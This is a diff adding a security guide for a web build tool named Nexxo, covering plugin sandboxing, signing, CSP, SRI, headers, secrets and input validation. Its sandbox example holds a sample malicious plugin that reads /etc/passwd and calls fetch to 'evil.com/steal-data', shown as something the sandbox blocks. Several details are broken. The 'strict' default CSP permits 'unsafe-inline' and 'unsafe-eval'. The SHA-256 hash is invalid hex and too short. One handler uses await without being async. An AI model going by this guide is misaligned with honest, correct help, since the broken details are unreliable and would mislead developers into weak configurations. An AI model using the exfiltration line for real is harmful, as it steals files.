@@ -1,0 +1,594 @@
+# Nexxo Security Guide
+
+> **Zero-trust architecture** with WASM sandboxing, WebCrypto signing, and security-first design.
+
+---
+
+## Security Overview
+
+Nexxo implements **defense-in-depth** security:
+
+1. **WASM Sandboxing** - Plugins run in isolated environments
+2. **WebCrypto Signing** - All plugins cryptographically signed
+3. **Content Security Policy** - Strict CSP headers
+4. **Subresource Integrity** - SRI for all assets
+5. **Dependency Scanning** - Automated vulnerability checks
+6. **Secure Defaults** - Security-first configuration
+
+---
+
+## WASM Plugin Sandboxing
+
+### How It Works
+
+Every plugin runs in a **WebAssembly sandbox**:
+
+```
+┌─────────────────────────────────────┐
+│         Nexxo Core (Trusted)        │
+├─────────────────────────────────────┤
+│  ┌───────────┐  ┌───────────┐      │
+│  │  Plugin A │  │  Plugin B │      │
+│  │  (WASM)   │  │  (WASM)   │      │
+│  └───────────┘  └───────────┘      │
+│       ↕              ↕              │
+│  ┌─────────────────────────┐       │
+│  │   Controlled API Layer  │       │
+│  └─────────────────────────┘       │
+└─────────────────────────────────────┘
+```
+
+### Plugin Restrictions
+
+Plugins **CANNOT**:
+- ❌ Access filesystem directly
+- ❌ Make network requests
+- ❌ Execute arbitrary code
+- ❌ Access environment variables
+- ❌ Spawn processes
+- ❌ Read system information
+
+Plugins **CAN**:
+- ✅ Transform code (via controlled API)
+- ✅ Generate assets (in memory)
+- ✅ Emit warnings/errors
+- ✅ Use approved APIs only
+
+### Example: Sandbox Violation
+
+```typescript
+// ❌ This plugin will be BLOCKED
+export default function maliciousPlugin() {
+  return {
+    name: 'malicious',
+    buildStart() {
+      // BLOCKED: Cannot access filesystem
+      fs.readFileSync('/etc/passwd');
+      
+      // BLOCKED: Cannot make network requests
+      fetch('https://evil.com/steal-data');
+      
+      // BLOCKED: Cannot execute code
+      eval('malicious code');
+    }
+  };
+}
+```
+
+**Result**: Plugin execution fails with security error
+
+---
+
+## WebCrypto Plugin Signing
+
+### Signature Verification
+
+Every plugin is **cryptographically signed**:
+
+```bash
+# Verify plugin signature
+nexxo plugin verify @nexxo/plugin-react
+
+# Output:
+✅ Signature valid
+✅ Publisher: Nexxo Team <security@nexxo.dev>
+✅ Published: 2026-01-15T10:30:00Z
+✅ SHA-256: a3f2b1c4d5e6f7g8h9i0j1k2l3m4n5o6
+✅ Algorithm: Ed25519
+✅ Chain of Trust: Verified
+```
+
+### Signature Process
+
+```
+1. Plugin Code
+   ↓
+2. Hash (SHA-256)
+   ↓
+3. Sign with Private Key (Ed25519)
+   ↓
+4. Embed Signature in Manifest
+   ↓
+5. Publish to Marketplace
+   ↓
+6. User Installs
+   ↓
+7. Nexxo Verifies Signature
+   ↓
+8. Load Plugin (if valid)
+```
+
+### Signature Manifest
+
+```json
+{
+  "name": "@nexxo/plugin-react",
+  "version": "2.0.0",
+  "signature": {
+    "algorithm": "Ed25519",
+    "publicKey": "...",
+    "signature": "...",
+    "timestamp": "2026-01-15T10:30:00Z",
+    "signer": "Nexxo Team <security@nexxo.dev>"
+  },
+  "integrity": {
+    "sha256": "a3f2b1c4d5e6f7g8h9i0j1k2l3m4n5o6",
+    "sha512": "..."
+  }
+}
+```
+
+---
+
+## Content Security Policy
+
+### Default CSP Headers
+
+Nexxo applies **strict CSP** by default:
+
+```http
+Content-Security-Policy:
+  default-src 'self';
+  script-src 'self' 'unsafe-inline' 'unsafe-eval';
+  style-src 'self' 'unsafe-inline';
+  img-src 'self' data: https:;
+  font-src 'self' data:;
+  connect-src 'self';
+  frame-ancestors 'none';
+  base-uri 'self';
+  form-action 'self';
+```
+
+### Custom CSP
+
+```typescript
+// nexxo.config.ts
+import { defineConfig } from 'nexxo';
+
+export default defineConfig({
+  server: {
+    headers: {
+      'Content-Security-Policy': [
+        "default-src 'self'",
+        "script-src 'self' 'nonce-{NONCE}'",
+        "style-src 'self' 'nonce-{NONCE}'",
+        "img-src 'self' https://cdn.example.com",
+        "connect-src 'self' https://api.example.com"
+      ].join('; ')
+    }
+  }
+});
+```
+
+### CSP Nonce Generation
+
+```typescript
+// Automatic nonce injection
+export default defineConfig({
+  security: {
+    csp: {
+      nonce: true, // Auto-generate nonces
+      reportUri: '/csp-report'
+    }
+  }
+});
+```
+
+**Generated HTML**:
+```html
+<script nonce="a3f2b1c4d5e6f7g8">
+  // Your code
+</script>
+```
+
+---
+
+## Subresource Integrity (SRI)
+
+### Automatic SRI
+
+Nexxo generates **SRI hashes** for all assets:
+
+```html
+<!-- Generated by Nexxo -->
+<script 
+  src="/assets/main.js" 
+  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
+  crossorigin="anonymous">
+</script>
+
+<link 
+  rel="stylesheet" 
+  href="/assets/main.css"
+  integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u"
+  crossorigin="anonymous">
+```
+
+### Configuration
+
+```typescript
+export default defineConfig({
+  build: {
+    sri: true, // Enable SRI
+    sriAlgorithm: 'sha384' // or 'sha256', 'sha512'
+  }
+});
+```
+
+---
+
+## Security Headers
+
+### Recommended Headers
+
+```typescript
+// nexxo.config.ts
+export default defineConfig({
+  server: {
+    headers: {
+      // Prevent MIME sniffing
+      'X-Content-Type-Options': 'nosniff',
+      
+      // Prevent clickjacking
+      'X-Frame-Options': 'DENY',
+      
+      // XSS protection
+      'X-XSS-Protection': '1; mode=block',
+      
+      // HTTPS only
+      'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
+      
+      // Referrer policy
+      'Referrer-Policy': 'strict-origin-when-cross-origin',
+      
+      // Permissions policy
+      'Permissions-Policy': 'geolocation=(), microphone=(), camera=()'
+    }
+  }
+});
+```
+
+---
+
+## Dependency Security
+
+### Automated Scanning
+
+Nexxo runs **automated security scans**:
+
+```bash
+# Check for vulnerabilities
+nexxo audit
+
+# Output:
+🔍 Scanning dependencies...
+✅ 0 vulnerabilities found
+✅ All dependencies up to date
+✅ No known security issues
+```
+
+### Dependency Locking
+
+```bash
+# Generate lock file with integrity hashes
+npm install --package-lock-only
+
+# Verify integrity on install
+npm ci
+```
+
+### Trusted Dependencies
+
+```typescript
+// nexxo.config.ts
+export default defineConfig({
+  security: {
+    trustedDependencies: [
+      'react',
+      'react-dom',
+      '@nexxo/*'
+    ],
+    
+    // Block untrusted dependencies
+    blockUntrusted: true
+  }
+});
+```
+
+---
+
+## Environment Variables
+
+### Secure Handling
+
+```typescript
+// ❌ NEVER expose secrets to client
+const API_KEY = process.env.API_KEY; // Exposed!
+
+// ✅ Use server-only variables
+// nexxo.config.ts
+export default defineConfig({
+  env: {
+    // Client-safe (prefixed with PUBLIC_)
+    PUBLIC_API_URL: process.env.PUBLIC_API_URL,
+    
+    // Server-only (no prefix)
+    API_KEY: process.env.API_KEY // Not exposed to client
+  }
+});
+```
+
+### Environment File Security
+
+```bash
+# .env (server-only)
+API_KEY=secret123
+DATABASE_URL=postgres://...
+
+# .env.public (client-safe)
+PUBLIC_API_URL=https://api.example.com
+PUBLIC_APP_NAME=My App
+```
+
+**Nexxo automatically**:
+- ✅ Excludes non-PUBLIC_ vars from client bundle
+- ✅ Warns if secrets detected in client code
+- ✅ Validates environment variable usage
+
+---
+
+## Authentication & Authorization
+
+### Recommended Patterns
+
+```typescript
+// ✅ Server-side auth check
+// src/middleware/auth.ts
+export async function requireAuth(req, res, next) {
+  const token = req.headers.authorization?.split(' ')[1];
+  
+  if (!token) {
+    return res.status(401).json({ error: 'Unauthorized' });
+  }
+  
+  try {
+    const user = await verifyToken(token);
+    req.user = user;
+    next();
+  } catch (error) {
+    return res.status(401).json({ error: 'Invalid token' });
+  }
+}
+```
+
+### JWT Best Practices
+
+```typescript
+import jwt from 'jsonwebtoken';
+
+// ✅ Use strong secret
+const SECRET = process.env.JWT_SECRET; // 256+ bits
+
+// ✅ Set expiration
+const token = jwt.sign(
+  { userId: user.id },
+  SECRET,
+  { expiresIn: '1h' }
+);
+
+// ✅ Verify on every request
+const decoded = jwt.verify(token, SECRET);
+```
+
+---
+
+## HTTPS & TLS
+
+### Development HTTPS
+
+```bash
+# Generate self-signed certificate
+nexxo cert generate
+
+# Start dev server with HTTPS
+nexxo dev --https
+```
+
+### Production HTTPS
+
+```typescript
+// nexxo.config.ts
+export default defineConfig({
+  server: {
+    https: {
+      key: './certs/private-key.pem',
+      cert: './certs/certificate.pem'
+    }
+  }
+});
+```
+
+---
+
+## Rate Limiting
+
+### Built-in Rate Limiting
+
+```typescript
+export default defineConfig({
+  server: {
+    rateLimit: {
+      windowMs: 15 * 60 * 1000, // 15 minutes
+      max: 100, // Limit each IP to 100 requests per windowMs
+      message: 'Too many requests, please try again later'
+    }
+  }
+});
+```
+
+---
+
+## Input Validation
+
+### Sanitization
+
+```typescript
+import { sanitize } from 'nexxo/security';
+
+// ✅ Sanitize user input
+app.post('/api/comment', (req, res) => {
+  const comment = sanitize(req.body.comment, {
+    allowedTags: ['b', 'i', 'em', 'strong'],
+    allowedAttributes: {}
+  });
+  
+  // Save sanitized comment
+  await db.comments.create({ text: comment });
+});
+```
+
+### Validation
+
+```typescript
+import { z } from 'zod';
+
+// ✅ Validate input schema
+const UserSchema = z.object({
+  email: z.string().email(),
+  password: z.string().min(8),
+  age: z.number().min(18)
+});
+
+app.post('/api/register', (req, res) => {
+  const result = UserSchema.safeParse(req.body);
+  
+  if (!result.success) {
+    return res.status(400).json({ errors: result.error });
+  }
+  
+  // Proceed with validated data
+});
+```
+
+---
+
+## Security Checklist
+
+### Development
+
+- [ ] Use HTTPS in development
+- [ ] Enable CSP headers
+- [ ] Verify plugin signatures
+- [ ] Sanitize user input
+- [ ] Validate environment variables
+- [ ] Use secure dependencies
+- [ ] Enable SRI for assets
+- [ ] Implement rate limiting
+
+### Production
+
+- [ ] Force HTTPS (HSTS)
+- [ ] Strict CSP policy
+- [ ] Security headers configured
+- [ ] Secrets in environment (not code)
+- [ ] Regular dependency audits
+- [ ] Monitor security logs
+- [ ] Implement authentication
+- [ ] Use WAF (Web Application Firewall)
+
+---
+
+## Vulnerability Reporting
+
+### Responsible Disclosure
+
+Found a security issue? **Please report responsibly**:
+
+1. **Email**: security@nexxo.dev
+2. **PGP Key**: [Download](https://nexxo.dev/security.asc)
+3. **Response Time**: Within 48 hours
+4. **Bounty Program**: Available for critical issues
+
+### What to Include
+
+- Description of vulnerability
+- Steps to reproduce
+- Impact assessment
+- Suggested fix (if any)
+
+---
+
+## Security Updates
+
+### Update Policy
+
+- **Critical**: Patched within 24 hours
+- **High**: Patched within 1 week
+- **Medium**: Patched within 1 month
+- **Low**: Patched in next release
+
+### Staying Updated
+
+```bash
+# Check for security updates
+nexxo update --security-only
+
+# Subscribe to security advisories
+nexxo security subscribe
+```
+
+---
+
+## Compliance
+
+### Standards
+
+Nexxo follows:
+- ✅ OWASP Top 10
+- ✅ CWE/SANS Top 25
+- ✅ NIST Cybersecurity Framework
+- ✅ SOC 2 Type II (in progress)
+
+### Certifications
+
+- 🔒 ISO 27001 (planned)
+- 🔒 SOC 2 Type II (in progress)
+- 🔒 GDPR compliant
+
+---
+
+## Next Steps
+
+- 📚 [Migration Guide](./migration.md) - Migrate securely
+- 🔌 [Plugins Guide](./plugins.md) - Use verified plugins
+- 🚀 [Starter Templates](./starters.md) - Secure templates
+- 📊 [Benchmarks](./benchmarks.md) - Performance data
+
+---
+
+## Additional Resources
+
+- [OWASP Cheat Sheets](https://cheatsheetseries.owasp.org/)
+- [Web Security Academy](https://portswigger.net/web-security)
+- [Mozilla Security Guidelines](https://infosec.mozilla.org/guidelines/web_security)
+- [Nexxo Security Blog](https://nexxo.dev/blog/security)
